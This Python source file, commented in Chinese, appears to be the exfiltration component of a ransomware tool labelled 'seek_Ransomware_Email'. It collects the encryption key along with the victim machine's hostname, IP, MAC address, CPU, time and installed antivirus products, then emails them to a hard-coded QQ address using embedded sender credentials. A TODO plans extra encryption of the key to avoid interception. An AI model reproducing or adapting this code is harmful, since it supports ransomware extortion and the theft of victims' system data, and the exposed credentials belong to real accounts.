#! encoding:utf-8

from system_manager import get_host_ip
from av_manager import check_av
import socket,smtplib,getmac,time,platform,json
from email.mime.text import MIMEText
""" 
TODO:key二次加密     
邮件发送时，key必须再做一次加密，因为email相当于明文发送key，有被监听到的几率
 """
def send_email(key,recive_email='623712611@qq.com'):
    '''发送邮件，
    参数为key和email(default)，
    无返回，发送成功会在控制台打印log信息'''
    msg_from = '497309060@qq.com'  # 发送方邮箱地址。
    password = 'yspprmpxeiktbgea'  # 发送方QQ邮箱授权码，不是QQ邮箱密码。
    #msg_to = '623712611@qq.com'  # 收件人邮箱地址。

    subject = "seek_Ransomware_Email"  # 主题。
    content = json.dump(gen_content(key))  # 邮件正文内容。
    msg = MIMEText(content, 'plain', 'utf-8')
 
    msg['Subject'] = subject
    msg['From'] = msg_from
    msg['To'] = recive_email
 
    try:
        client = smtplib.SMTP_SSL('smtp.qq.com', smtplib.SMTP_SSL_PORT)
        print("连接到邮件服务器成功");

        client.login(msg_from, password);
        print("登录成功")

        client.sendmail(msg_from, recive_email, msg.as_string())
        print("发送成功");
    except smtplib.SMTPException as e:
        print("发送邮件异常")
    finally:
        client.quit()

def gen_content(key):
    '''生成邮件内容'''
    # DONE:邮件内容数据结构为字典
    # DONE：将安全软件信息也纳入到邮件内容中
    content=dict();
    
    content['key']=key;
    content['hostname']=socket.gethostname();
    # content['local_ip']=socket.gethostbyname(socket.gethostname())
    content['local_ip']=get_host_ip()
    content['MAC_address']=getmac.get_mac_address()
    content['CPU']=platform.processor()
    content['localtime']=time.strftime('%Y-%m-%d-%l-%M-%S',  time.localtime(time.time()))
    content['python_version']=platform.python_version()
    content['av_list']=check_av()

    return content

if __name__ == "__main__":
    pass